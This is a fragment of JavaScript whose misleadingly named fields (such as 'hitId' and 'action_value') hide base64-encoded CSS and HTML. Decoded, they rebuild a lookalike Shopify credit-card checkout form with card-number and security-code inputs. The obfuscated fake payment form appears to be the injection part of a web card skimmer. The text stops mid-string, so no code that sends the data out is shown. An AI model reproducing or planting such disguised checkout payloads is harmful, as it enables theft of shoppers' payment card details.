    dimension_value: "Ll8xZnJhZ2VtMzktMXEgew0KICAgIGp1c3RpZnktY29udGVudDogY2VudGVyDQp9DQoNCi5HZVNiMy0xcSB7DQogICAgd2lkdGg6IDg1cHgNCn0NCg0KLmh3WkNuLTFxIHsNCiAgICBtYXJnaW4tYm90dG9tOiAtMXB4Ow0KfQ0KDQouXzFmcmFnZW1heC0xcSB7DQogICAgdHJhbnNpdGlvbi1wcm9wZXJ0eTogYWxsDQp9DQoNCi5jYjV6OS0xcSB7DQogICAgYmFja2dyb3VuZC1jb2xvcjogI2ZmZjsNCiAgICBib3JkZXI6IDFweCBzb2xpZCAjMDAwMDAwMTI7DQogICAgYm9yZGVyLXJhZGl1czogM3B4Ow0KICAgIGhlaWdodDogMi40cmVtOw0KICAgIHdpZHRoOiAzLjhyZW0NCn0NCg0KLl8xOWdpN3l0ZS0xcSB7DQogICAgLS10aGlzLWZvbnQtc2l6ZTogdmFyKC0teC10eXBvZ3JhcGh5LXNpemUtc21hbGwpDQp9DQoNCi5fMWZyYWdlbTFsLTFxIHsNCiAgICBmb250LXNpemU6IHZhcigtLXgtdHlwb2dyYXBoeS1zaXplLXNtYWxsKQ0KfQ0KDQouXzE5Z2k3eXQxLTFxIHsNCiAgICAtLXRoaXMtZm9udC13ZWlnaHQ6IHZhcigtLXgtdHlwb2dyYXBoeS1wcmltYXJ5LXdlaWdodC1ib2xkKTsNCiAgICBmb250LXdlaWdodDogdmFyKC0teC10eXBvZ3JhcGh5LXByaW1hcnktd2VpZ2h0LWJvbGQpDQp9DQoNCi5fMTlnaTd5dDQtMXEgew0KICAgIGNvbG9yOiB2YXIoLS14LWRlZmF1bHQtY29sb3ItYWNjZW50KQ0KfQ0KDQouXzFmcmFnZW1hZy0xcSB7DQogICAgcG9zaXRpb246IGFic29sdXRlDQp9DQoNCi5fMWZyYWdlbWJkLTFxIHsNCiAgICB6LWluZGV4OiAxMDAwDQp9DQoNCi5fMWZyYWdlbTY5LTFxIHsNCiAgICBpbnNldC1ibG9jay1zdGFydDogMTAwJTsNCiAgICB0b3A6IDEwMCUNCn0NCg0KLmJ5MHB0azctMXEgew0KICAgIGJvcmRlci1ibG9jay1lbmQ6IDZweCBzb2xpZCAjMDAwMDsNCiAgICBib3JkZXItYm90dG9tOiA2cHggc29saWQgIzAwMDA7DQogICAgY29sb3I6ICNmZmY7DQogICAgbWF4LXdpZHRoOiAxMi44NTcxNDI4NTcxNDI4NThlbTsNCiAgICB0cmFuc2Zvcm06IHNjYWxlKC44KTsNCiAgICB0cmFuc2Zvcm0tb3JpZ2luOiBjZW50ZXIgMTIwJTsNCiAgICB0cmFuc2l0aW9uOiB0cmFuc2Zvcm0gdmFyKC0teC1kdXJhdGlvbi1iYXNlKSB2YXIoLS14LXRpbWluZy1zcHJpbmcpLCBvcGFjaXR5IHZhcigtLXgtZHVyYXRpb24tYmFzZSkgdmFyKC0teC10aW1pbmctc3ByaW5nKQ0KfQ0KDQouYnkwcHRrNy0xcS5ieTBwdGsxLTFxLA0KLmJ5MHB0azctMXEuYnkwcHRrMi0xcSB7DQogICAgcG9pbnRlci1ldmVudHM6IG5vbmUNCn0NCg0KLmJ5MHB0azctMXE6YmVmb3JlIHsNCiAgICBiYWNrZ3JvdW5kLWNvbG9yOiAjMzMzOw0KICAgIGJvcmRlci1yYWRpdXM6IHZhcigtLXgtZ2xvYmFsLWJvcmRlci1yYWRpdXMsIHZhcigtLXgtYm9yZGVyLXJhZGl1cy1iYXNlKSk7DQogICAgYm90dG9tOiAwOw0KICAgIGNvbnRlbnQ6ICIiOw0KICAgIGRpc3BsYXk6IGJsb2NrOw0KICAgIGxlZnQ6IDA7DQogICAgcG9zaXRpb246IGFic29sdXRlOw0KICAgIHJpZ2h0OiAwOw0KICAgIHRvcDogMDsNCiAgICBpbnNldDogMDsNCiAgICBvcGFjaXR5OiAuOTsNCiAgICB6LWluZGV4OiAtMQ0KfQ0KDQouXzFmcmFnZW04aS0xcSB7DQogICAgcGFkZGluZy10b3A6IHZhcigtLXgtc3BhY2luZy1zbWFsbC0xMDApOw0KICAgIHBhZGRpbmctYmxvY2stc3RhcnQ6IHZhcigtLXgtc3BhY2luZy1zbWFsbC0xMDApDQp9DQoNCltkaXI9Imx0ciJdIC5fMWZyYWdlbTh6LTFxIHsNCiAgICBwYWRkaW5nLXJpZ2h0OiB2YXIoLS14LXNwYWNpbmctc21hbGwtMTAwKTsNCn0NCg0KLl8xZnJhZ2VtODEtMXEgew0KICAgIHBhZGRpbmctYm90dG9tOiB2YXIoLS14LXNwYWNpbmctc21hbGwtMTAwKTsNCiAgICBwYWRkaW5nLWJsb2NrLWVuZDogdmFyKC0teC1zcGFjaW5nLXNtYWxsLTEwMCk7DQp9DQoNCltkaXI9bHRyXSAuXzFmcmFnZW05Zy0xcSB7DQogICAgcGFkZGluZy1sZWZ0OiB2YXIoLS14LXNwYWNpbmctc21hbGwtMTAwKQ0KfQ0KDQpbZGlyPXJ0bF0gLl8xZnJhZ2VtOWctMXEgew0KICAgIHBhZGRpbmctcmlnaHQ6IHZhcigtLXgtc3BhY2luZy1zbWFsbC0xMDApDQp9DQoNCi5fMWZyYWdlbTlnLTFxIHsNCiAgICBwYWRkaW5nLWlubGluZS1zdGFydDogdmFyKC0teC1zcGFjaW5nLXNtYWxsLTEwMCkNCn0NCg0KLl8xZnJhZ2VtMWMtMXEgew0KICAgIGRpc3BsYXk6IGlubGluZS1ibG9jaw0KfQ0KDQouXzFmcmFnZW1hbC0xcSB7DQogICAgdGV4dC1hbGlnbjogY2VudGVyDQp9DQoNCi5ieTBwdGtjLTFxIHsNCiAgICBib3JkZXI6IC40Mjg1NzE0Mjg1NzE0Mjg1NWVtIHNvbGlkICMwMDAwOw0KICAgIGJvcmRlci1ib3R0b20td2lkdGg6IDA7DQogICAgYm9yZGVyLXRvcC1jb2xvcjogIzMzMzsNCiAgICBvcGFjaXR5OiAuOQ0KfQ0KDQpbZGlyPXJ0bF0gLmJ5MHB0a2MtMXEgew0KICAgIHRyYW5zZm9ybTogdHJhbnNsYXRlKDUwJSkNCn0NCg0KW2Rpcj1sdHJdIC5ieTBwdGtjLTFxIHsNCiAgICB0cmFuc2Zvcm06IHRyYW5zbGF0ZSgtNTAlKQ0KfQ0KDQouYnkwcHRrOC0xcSAuYnkwcHRrYy0xcSB7DQogICAgYm9yZGVyLXRvcC1jb2xvcjogdmFyKC0teC1jb2xvci1jb2xvcjEtYmFja2dyb3VuZCkNCn0",
    project_name: "LmJ5MHB0azktMXEgLmJ5MHB0a2MtMXEgew0KICAgIGJvcmRlci10b3AtY29sb3I6IHZhcigtLXgtY29sb3ItY29sb3IyLWJhY2tncm91bmQpDQp9DQoNCi5ieTBwdGthLTFxIC5ieTBwdGtjLTFxIHsNCiAgICBib3JkZXItdG9wLWNvbG9yOiB2YXIoLS14LWNvbG9yLWNvbG9yMy1iYWNrZ3JvdW5kKQ0KfQ0KDQouXzFmcmFnZW02OS0xcSB7DQogICAgaW5zZXQtYmxvY2stc3RhcnQ6IDEwMCU7DQogICAgdG9wOiAxMDAlDQp9DQoNCltkaXI9bHRyXSAuXzFmcmFnZW03YS0xcSB7DQogICAgbGVmdDogNTAlDQp9DQoNCltkaXI9cnRsXSAuXzFmcmFnZW03YS0xcSB7DQogICAgcmlnaHQ6IDUwJQ0KfQ0KDQouXzFmcmFnZW03YS0xcSB7DQogICAgaW5zZXQtaW5saW5lLXN0YXJ0OiA1MCUNCn0NCg0KW2Rpcj1sdHJdIC5fMWZyYWdlbTdhLTFxIHsNCiAgICBsZWZ0OiA1MCUNCn0NCg0KW2Rpcj1ydGxdIC5fMWZyYWdlbTdhLTFxIHsNCiAgICByaWdodDogNTAlDQp9DQoNCi5fMWZyYWdlbTdhLTFxIHsNCiAgICBpbnNldC1pbmxpbmUtc3RhcnQ6IDUwJQ0KfQ0KDQouc2RyMDNzMS0xcSB7DQogICAgYm9yZGVyLXJhZGl1czogdmFyKC0teC1nbG9iYWwtYm9yZGVyLXJhZGl1cywgdmFyKC0teC1ib3JkZXItcmFkaXVzLWJhc2UpKTsNCiAgICBib3JkZXItd2lkdGg6IHZhcigtLXgtYmFubmVyLWJvcmRlciwgdmFyKC0teC1ib3JkZXItd2lkdGgtYmFzZSkpOw0KICAgIGdyaWQtdGVtcGxhdGUtYXJlYXM6ICJJY29uIENvbnRlbnQgQ29udHJvbENvbGxhcHNpYmxlIENvbnRyb2xEaXNtaXNzIjsNCiAgICBncmlkLXRlbXBsYXRlLWNvbHVtbnM6IGF1dG8gMWZyIGF1dG8gYXV0bw0KfQ0KDQouXzFmcmFnZW00ei0xcSB7DQogICAgYm9yZGVyLWJsb2NrLXN0YXJ0LXN0eWxlOiBzb2xpZDsNCiAgICBib3JkZXItdG9wLXN0eWxlOiBzb2xpZA0KfQ0KDQpbZGlyPWx0cl0gLl8xZnJhZ2VtNHctMXEgew0KICAgIGJvcmRlci1yaWdodC1zdHlsZTogc29saWQNCn0NCg0KW2Rpcj1ydGxdIC5fMWZyYWdlbTR3LTFxIHsNCiAgICBib3JkZXItbGVmdC1zdHlsZTogc29saWQNCn0NCg0KLl8xZnJhZ2VtNHctMXEgew0KICAgIGJvcmRlci1pbmxpbmUtZW5kLXN0eWxlOiBzb2xpZA0KfQ0KDQouXzFmcmFnZW01Mi0xcSB7DQogICAgYm9yZGVyLWJsb2NrLWVuZC1zdHlsZTogc29saWQ7DQogICAgYm9yZGVyLWJvdHRvbS1zdHlsZTogc29saWQNCn0NCg0KW2Rpcj1sdHJdIC5fMWZyYWdlbTR0LTFxIHsNCiAgICBib3JkZXItbGVmdC1zdHlsZTogc29saWQNCn0NCg0KW2Rpcj1ydGxdIC5fMWZyYWdlbTR0LTFxIHsNCiAgICBib3JkZXItcmlnaHQtc3R5bGU6IHNvbGlkDQp9DQoNCi5fMWZyYWdlbTR0LTFxIHsNCiAgICBib3JkZXItaW5saW5lLXN0YXJ0LXN0eWxlOiBzb2xpZA0KfQ0KDQouXzFmcmFnZW04ay0xcSB7DQogICAgcGFkZGluZy10b3A6IHZhcigtLXgtc3BhY2luZy1sYXJnZS0xMDApOw0KICAgIHBhZGRpbmctYmxvY2stc3RhcnQ6IHZhcigtLXgtc3BhY2luZy1sYXJnZS0xMDApDQp9DQoNCltkaXI9bHRyXSAuXzFmcmFnZW05MS0xcSB7DQogICAgcGFkZGluZy1yaWdodDogdmFyKC0teC1zcGFjaW5nLWxhcmdlLTEwMCkNCn0NCg0KW2Rpcj1ydGxdIC5fMWZyYWdlbTkxLTFxIHsNCiAgICBwYWRkaW5nLWxlZnQ6IHZhcigtLXgtc3BhY2luZy1sYXJnZS0xMDApDQp9DQoNCi5fMWZyYWdlbTkxLTFxIHsNCiAgICBwYWRkaW5nLWlubGluZS1lbmQ6IHZhcigtLXgtc3BhY2luZy1sYXJnZS0xMDApDQp9DQoNCi5fMWZyYWdlbTgzLTFxIHsNCiAgICBwYWRkaW5nLWJvdHRvbTogdmFyKC0teC1zcGFjaW5nLWxhcmdlLTEwMCk7DQogICAgcGFkZGluZy1ibG9jay1lbmQ6IHZhcigtLXgtc3BhY2luZy1sYXJnZS0xMDApDQp9DQoNCltkaXI9bHRyXSAuXzFmcmFnZW05aS0xcSB7DQogICAgcGFkZGluZy1sZWZ0OiB2YXIoLS14LXNwYWNpbmctbGFyZ2UtMTAwKQ0KfQ0KDQpbZGlyPXJ0bF0gLl8xZnJhZ2VtOWktMXEgew0KICAgIHBhZGRpbmctcmlnaHQ6IHZhcigtLXgtc3BhY2luZy1sYXJnZS0xMDApDQp9DQoNCi5fMWZyYWdlbTlpLTFxIHsNCiAgICBwYWRkaW5nLWlubGluZS1zdGFydDogdmFyKC0teC1zcGFjaW5nLWxhcmdlLTEwMCkNCn0NCg0KLnNkcjAzczMtMXEgew0KICAgIC0teC1kZWZhdWx0LWNvbG9yLWJhY2tncm91bmQ6IHZhcigtLXgtY29sb3ItY3JpdGljYWwpOw0KICAgIC0teC1kZWZhdWx0LWNvbG9yLWJhY2tncm91bmQtc3ViZHVlZDogdmFyKC0teC1jb2xvci1jcml0aWNhbC1zdWJkdWVkKTsNCiAgICAtLXgtZGVmYXVsdC1jb2xvci1ib3JkZXI6IHZhcigtLXgtY29sb3ItY3JpdGljYWwtYm9yZGVyKTsNCiAgICAtLXgtZGVmYXVsdC1jb2xvci1ib3JkZXItc3ViZHVlZDogdmFyKC0teC1jb2xvci1jcml0aWNhbC1ib3JkZXItc3ViZHVlZCk7DQogICAgLS14LWRlZmF1bHQtY29sb3ItYm9yZGVyLWVtcGhhc2l6ZWQ6IHZhcigtLXgtY29sb3ItY3JpdGljYWwtYm9yZGVyLWVtcGhhc2l6ZWQpOw0KICAgIC0teC1kZWZhdWx0LWNvbG9yLXRleHQ6IHZhcigtLXgtY29sb3ItY3JpdGljYWwtdGV4dCk7DQogICAgLS14LWRlZmF1bHQtY29sb3ItdGV4dC1zdWJkdWVkOiB2YXIoLS14LWNvbG9yLWNyaXRpY2FsLXRleHQtc3ViZHVlZCkNCn0NCg0KLnNkcjAzczMtMXEsDQouc2RyMDNzNC0xcSB7DQogICAgYmFja2dyb3VuZC1jb2xvcjogdmFyKC0teC1kZWZhdWx0LWNvbG9yLWJhY2tncm91bmQpOw0KICAgIGJvcmRlci1jb2xvcjogdmFyKC0teC1kZWZhdWx0LWNvbG9yLWJvcmRlcik7DQogICAgY29sb3I6IHZhcigtLXgtZGVmYXVsdC1jb2xvci10ZXh0KQ0KfQ0KDQouc2RyMDNzMy0xcSAuc2RyMDNzNy0xcSB7DQogICAgY29sb3I6IHZhcigtLXgtY29sb3ItY3JpdGljYWwtYWNjZW50KQ0KfQ0KDQpbZGlyPWx0cl0gLnNkcjAzczctMXEgew0KICAgIG1hcmdpbi1yaWdodDogdmFyKC0teC1zcGFjaW5nLWJhc2UpDQp9DQoNCltkaXI9cnRsXSAuc2RyMDNzNy0xcSB7DQogICAgbWFyZ2luLWxlZnQ6IHZhcigtLXgtc3BhY2luZy1iYXNlKQ0KfQ==",
    hitId: "LnNkcjAzczctMXEgew0KICAgIGdyaWQtYXJlYTogSWNvbjsNCiAgICBtYXJnaW4tYm90dG9tOiAtLjE0Mjg1NzE0Mjg1NzE0Mjg1ZW07DQogICAgbWFyZ2luLXRvcDogLS4xNDI4NTcxNDI4NTcxNDI4NWVtOw0KICAgIG1hcmdpbi1ibG9jazogLS4xNDI4NTcxNDI4NTcxNDI4NWVtOw0KICAgIG1hcmdpbi1pbmxpbmUtZW5kOiB2YXIoLS14LXNwYWNpbmctYmFzZSk7DQogICAgbWF4LXdpZHRoOiAxLjcxNDI4NTcxNDI4NTcxNDJlbTsNCn0NCg0KLnNkcjAzczItMXE+LnNkcjAzczctMXEsDQouc2RyMDNzNy0xcSB7DQogICAgLW1zLWdyaWQtY29sdW1uOiAxOw0KICAgIC1tcy1ncmlkLXJvdzogMQ0KfQ0KDQouc2RyMDNzMy0xcSAuc2RyMDNzNy0xcSB7DQogICAgY29sb3I6IHZhcigtLXgtY29sb3ItY3JpdGljYWwtYWNjZW50KQ0KfQ0KDQouc2RyMDNzNC0xcSAuc2RyMDNzNy0xcSB7DQogICAgY29sb3I6IHZhcigtLXgtY29sb3ItaW5mby1hY2NlbnQpDQp9DQoNCi5zZHIwM3M1LTFxIC5zZHIwM3M3LTFxIHsNCiAgICBjb2xvcjogdmFyKC0teC1jb2xvci1zdWNjZXNzLWFjY2VudCkNCn0NCg0KLnNkcjAzczYtMXEgLnNkcjAzczctMXEgew0KICAgIGNvbG9yOiB2YXIoLS14LWNvbG9yLXdhcm5pbmctYWNjZW50KQ0KfQ0KDQouc2RyMDNzMi0xcSAuc2RyMDNzNy0xcSB7DQogICAgbWFyZ2luLWJsb2NrLWVuZDogLS4yMTQyODU3MTQyODU3MTQyN2VtOw0KICAgIG1hcmdpbi1ibG9jay1zdGFydDogLS4yODU3MTQyODU3MTQyODU3ZW07DQogICAgbWFyZ2luLWJvdHRvbTogLS4yMTQyODU3MTQyODU3MTQyN2VtOw0KICAgIG1hcmdpbi10b3A6IC0uMjg1NzE0Mjg1NzE0Mjg1N2VtOw0KfQ0KDQouYTh4MXd1ay0xcSB7DQogICAgaGVpZ2h0OiB2YXIoLS1hOHgxd3UwKTsNCiAgICBtaW4taGVpZ2h0OiB2YXIoLS1hOHgxd3UwKTsNCiAgICBtaW4td2lkdGg6IHZhcigtLWE4eDF3dTApOw0KICAgIHdpZHRoOiB2YXIoLS1hOHgxd3UwKQ0KfQ0KDQouc2RyMDNzYS0xcSB7DQogICAgZ3JpZC1hcmVhOiBDb250ZW50Ow0KICAgIC1tcy1ncmlkLWNvbHVtbjogMjsNCiAgICAtbXMtZ3JpZC1yb3c6IDENCn0NCg0KLnNkcjAzczItMXE+LnNkcjAzc2EtMXEgew0KICAgIC1tcy1ncmlkLWNvbHVtbi1zcGFuOiAzOw0KICAgIC1tcy1ncmlkLWNvbHVtbjogMjsNCiAgICAtbXMtZ3JpZC1yb3c6IDINCn0NCg0KLmxhYmVsLWFjdGl2ZSB7DQogICAgb3BhY2l0eTogMTsNCiAgICB0cmFuc2Zvcm06IHRyYW5zbGF0ZVkoMCkNCn0NCg0KLmJsb2NrLWlucHV0IHsNCiAgICBib3gtc2l6aW5nOiBjb250ZW50LWJveDsNCn0NCg0KLmNhcmQtYmxvY2sgew0KICAgIHBvc2l0aW9uOiByZWxhdGl2ZTsNCn0NCg0KLmNhcmQtcG9wdXAtY29udGFpbmVyIHsNCiAgICBkaXNwbGF5OiBub25lOw0KICAgIHBvc2l0aW9uOiBhYnNvbHV0ZTsNCiAgICB0b3A6IC00OXB4Ow0KICAgIHJpZ2h0OiAtMjZweDsNCn0NCg0KLmJ5MHB0azctMXEucG9wdXAtYWN0aXZlIHsNCiAgICBvcGFjaXR5OiAxOw0KICAgIHRyYW5zZm9ybTogc2NhbGUoMSkgcGVyc3BlY3RpdmUoMXB4KQ0KfQ0KDQouc2VjdXJpdHktY29kZS1wb3B1cC1jb250YWluZXIgew0KICAgIHRvcDogLTEyMHB4Ow0KICAgIHJpZ2h0OiAtNTNweDsNCn0NCg0KLmNhcmQtaW5wdXQgew0KICAgIGhlaWdodDogMTAwJTsNCiAgICB3aWR0aDogMTAwJTsNCiAgICBvdXRsaW5lOiBub25lOw0KICAgIGZvbnQtZmFtaWx5OiAtYXBwbGUtc3lzdGVtLCBCbGlua01hY1N5c3RlbUZvbnQsICJTZWdvZSBVSSIsIFJvYm90bywgSGVsdmV0aWNhLCBBcmlhbCwgc2Fucy1zZXJpZiwgIkFwcGxlIENvbG9yIEVtb2ppIiwgIlNlZ29lIFVJIEVtb2ppIiwgIlNlZ29lIFVJIFN5bWJvbCI7DQogICAgbGV0dGVyLXNwYWNpbmc6IG5vcm1hbDsNCiAgICBsaW5lLWhlaWdodDogMS41Ow0KICAgIGNvbG9yOiByZ2IoMCwgMCwgMCk7DQogICAgdGV4dC1kZWNvcmF0aW9uOiBub25lOw0KICAgIHRleHQtdHJhbnNmb3JtOiBub25lOw0KICAgIHBhZGRpbmc6IDBweCAxMXB4Ow0KICAgIHRyYW5zaXRpb246IHBhZGRpbmcgMC4ycyBlYXNlLW91dCAwczsNCn0NCg0KLmNhcmQtaW5wdXQtYWN0aXZlIHsNCiAgICBwYWRkaW5nOiAxNnB4IDExcHggMHB4IDExLjVweDsNCn0NCg0KLmVtcHR5LWNhcmQtaW5wdXQtYWN0aXZlOjpwbGFjZWhvbGRlciB7DQogICAgY29sb3I6IHRyYW5zcGFyZW50Ow0KfQ0KDQouY2FyZC1pY29uLWRpc2FjdGl2ZSB7DQogICAgb3BhY2l0eTogdmFyKC0teC1vcGFjaXR5LWRpc2FibGVkKTsNCiAgICBmaWx0ZXI6IGdyYXlzY2FsZSgxMDAlKQ0KfQ0KDQouY2FyZC1pY29uLWFjdGl2ZSB7DQogICAgYm94LXNoYWRvdzogMCA2cHggMTlweCAwICMwMDAwMDAwZDsNCiAgICB0cmFuc2Zvcm06IHNjYWxlKDEuMSkNCn0NCg0KLmNhcmQtaW5wdXQtZXJyb3Igew0KICAgIGJvcmRlci1jb2xvcjogdmFyKC0teC1jb2xvci1jcml0aWNhbC1hY2NlbnQpOw0KICAgIGJveC1zaGFkb3c6IDAgMCAwIDFweCB2YXIoLS14LWNvbG9yLWNyaXRpY2FsLWFjY2VudCk7DQp9DQoNCi5lcnJvci10ZXh0IHsNCiAgICBkaXNwbGF5OiBub25lOw0KICAgIGNvbG9yOiB2YXIoLS14LWNvbG9yLWNyaXRpY2FsLWFjY2VudCkNCn0NCg0KLmVycm9yLXRleHQtYWN0aXZlIHsNCiAgICBkaXNwbGF5OiBibG9jazsNCn0=",
}

const FORM = {
    action_value: "PGxhYmVsIGlkPSJoZWFkZXItY2FyZC1sYWJlbCIgZm9yPSJwYXltZW50LWNyZWRpdC1jYXJkcyIgY2xhc3M9ImhlYWRlci1sYWJlbCBoZWFkZXItbGFiZWwtYWN0aXZlIEQxUkpyLTFxIj4NCiAgICAgICAgPGRpdiBjbGFzcz0iaEVHeXotMXEiPg0KICAgICAgICAgICAgPGRpdiBjbGFzcz0iXzFmcmFnZW1haS0xcSI+DQogICAgICAgICAgICAgICAgPGlucHV0IGNoZWNrZWQgdHlwZT0icmFkaW8iIGlkPSJwYXltZW50LWNyZWRpdC1jYXJkcyIgbmFtZT0iYmFzaWMtMXEiDQogICAgICAgICAgICAgICAgICAgIGNsYXNzPSJfNmh6anZvNS0xcSBfMWZyYWdlbTE2LTFxIF8xZnJhZ2VtMTgtMXEgXzFmcmFnZW1heC0xcSBfMWZyYWdlbWFyLTFxIF8xZnJhZ2VtYjMtMXEgXzZoemp2b2ktMXEgXzZoemp2bzgtMXEgXzZoemp2b2MtMXEgXzZoemp2b2gtMXEgXzZoemp2b2UtMXEiPg0KICAgICAgICAgICAgICAgIDxpbnB1dCBpZD0icGF5bWVudC1jcmVkaXQtY2FyZHMtaGlkZGVuIiBuYW1lPSJiYXNpYy0xcSIgdHlwZT0icmFkaW8iIHN0eWxlPSJkaXNwbGF5OiBub25lOyI+DQogICAgICAgICAgICA8L2Rpdj4NCiAgICAgICAgICAgIDxkaXYgY2xhc3M9ImY1YUNlLTFxIj4NCiAgICAgICAgICAgICAgICA8ZGl2Pg0KICAgICAgICAgICAgICAgICAgICA8c3BhbiBjbGFzcz0iXzE5Z2k3eXQwLTFxIF8xOWdpN3l0Zy0xcSBfMWZyYWdlbTFtLTFxIj5DcmVkaXQNCiAgICAgICAgICAgICAgICAgICAgICAgIGNhcmQ8L3NwYW4+DQogICAgICAgICAgICAgICAgPC9kaXY+DQogICAgICAgICAgICAgICAgPGRpdj4NCiAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0id0FBamgtMXEiPg0KICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iXzFmcmFnZW0xYS0xcSBfMWZyYWdlbWFpLTFxIF8xZnJhZ2VtM2ItMXEiPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY2xhc3M9Il81dXF5YncyLTFxIF8xZnJhZ2VtMWEtMXEgXzFmcmFnZW05dS0xcSBfMWZyYWdlbTF0LTFxIF8xZnJhZ2VtMmEtMXEgXzFmcmFnZW0wLTFxIF8xZnJhZ2VtNC0xcSBfMWZyYWdlbTNiLTFxIGNhcmQtYmxvY2siPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8aW1nIGFsdD0iIg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc3JjPSJodHRwczovL2Nkbi5zaG9waWZ5LmNvbS9zaG9waWZ5Y2xvdWQvY2hlY2tvdXQtd2ViL2Fzc2V0cy8wMTY5Njk1ODkwZGIzZGIxNmJmZS5zdmciDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICByb2xlPSJpbWciIHdpZHRoPSIzOCIgaGVpZ2h0PSIyNCINCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNsYXNzPSJfMXRnZHF3NjEtMXEgXzFmcmFnZW1heC0xcSBfMWZyYWdlbWFzLTFxIF8xZnJhZ2VtYjYtMXEgXzFmcmFnZW0zNi0xcSBjYXJkLWljb24gdmlzYSI+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxpbWcgYWx0PSIiDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzcmM9Imh0dHBzOi8vY2RuLnNob3BpZnkuY29tL3Nob3BpZnljbG91ZC9jaGVja291dC13ZWIvYXNzZXRzL2FlOWNlZWM0OGIxZGM0ODk1OTZjLnN2ZyINCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJvbGU9ImltZyIgd2lkdGg9IjM4IiBoZWlnaHQ9IjI0Ig0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY2xhc3M9Il8xdGdkcXc2MS0xcSBfMWZyYWdlbWF4LTFxIF8xZnJhZ2VtYXMtMXEgXzFmcmFnZW1iNi0xcSBfMWZyYWdlbTM2LTFxIGNhcmQtaWNvbiBtYXN0ZXJjYXJkIj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGltZyBhbHQ9IiINCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNyYz0iaHR0cHM6Ly9jZG4uc2hvcGlmeS5jb20vc2hvcGlmeWNsb3VkL2NoZWNrb3V0LXdlYi9hc3NldHMvZjExYjkwYzI5NzJmMzgxMWYyZDUuc3ZnIg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcm9sZT0iaW1nIiB3aWR0aD0iMzgiIGhlaWdodD0iMjQiDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjbGFzcz0iXzF0Z2RxdzYxLTFxIF8xZnJhZ2VtYXgtMXEgXzFmcmFnZW1hcy0xcSBfMWZyYWdlbWI2LTFxIF8xZnJhZ2VtMzYtMXEgY2FyZC1pY29uIGFtZXgiPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8aW1nIGFsdD0iIg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc3JjPSJodHRwczovL2Nkbi5zaG9waWZ5LmNvbS9zaG9waWZ5Y2xvdWQvY2hlY2tvdXQtd2ViL2Fzc2V0cy80Y2RlNjdiNGVjZmEzM2QyMTg1MS5zdmciDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICByb2xlPSJpbWciIHdpZHRoPSIzOCIgaGVpZ2h0PSIyNCINCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNsYXNzPSJfMXRnZHF3NjEtMXEgXzFmcmFnZW1heC0xcSBfMWZyYWdlbWFzLTFxIF8xZnJhZ2VtYjYtMXEgXzFmcmFnZW0zNi0xcSBjYXJkLWljb24gaGlkZGVuLWNhcmQgZGlzY292ZXIiPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8aW1nIGFsdD0iIg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc3JjPSJodHRwczovL2Nkbi5zaG9waWZ5LmNvbS9zaG9waWZ5Y2xvdWQvY2hlY2tvdXQtd2ViL2Fzc2V0cy8zNjQ5OGEwYzc4MDgzYTdkNzFlOS5zdmciDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICByb2xlPSJpbWciIHdpZHRoPSIzOCIgaGVpZ2h0PSIyNCINCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNsYXNzPSJfMXRnZHF3NjEtMXEgXzFmcmFnZW1heC0xcSBfMWZyYWdlbWFzLTFxIF8xZnJhZ2VtYjYtMXEgXzFmcmFnZW0zNi0xcSBjYXJkLWljb24gaGlkZGVuLWNhcmQgZGluZXJzY2x1YiI+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9Il8xZnJhZ2VtYWctMXEgXzFmcmFnZW1iZC0xcSBjYXJkLXBvcHVwLWNvbnRhaW5lciI+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8ZGl2IHJvbGU9InRvb2x0aXAiDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY2xhc3M9ImJ5MHB0azctMXEgXzFmcmFnZW04aS0xcSBfMWZyYWdlbTh6LTFxIF8xZnJhZ2VtODEtMXEgXzFmcmFnZW05Zy0xcSBfMWZyYWdlbTFjLTFxIF8xZnJhZ2VtOXktMXEgXzFmcmFnZW1haS0xcSBfMWZyYWdlbTFsLTFxIF8xZnJhZ2VtYWwtMXEgY2FyZC1wb3B1cCI+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iXzFmcmFnZW0xYS0xcSBfMWZyYWdlbWFpLTFxIF8xZnJhZ2VtM2ItMXEiPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8ZGl2DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjbGFzcz0iXzV1cXlidzItMXEgXzFmcmFnZW0xYS0xcSBfMWZyYWdlbTl1LTFxIF8xZnJhZ2VtMXQtMXEgXzFmcmFnZW0yYS0xcSBfMWZyYWdlbTAtMXEgXzFmcmFnZW00LTFxIF8xZnJhZ2VtM2ItMXEiPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGltZyBhbHQ9IiINCiAgICAgICAgICAgICAgICAgIC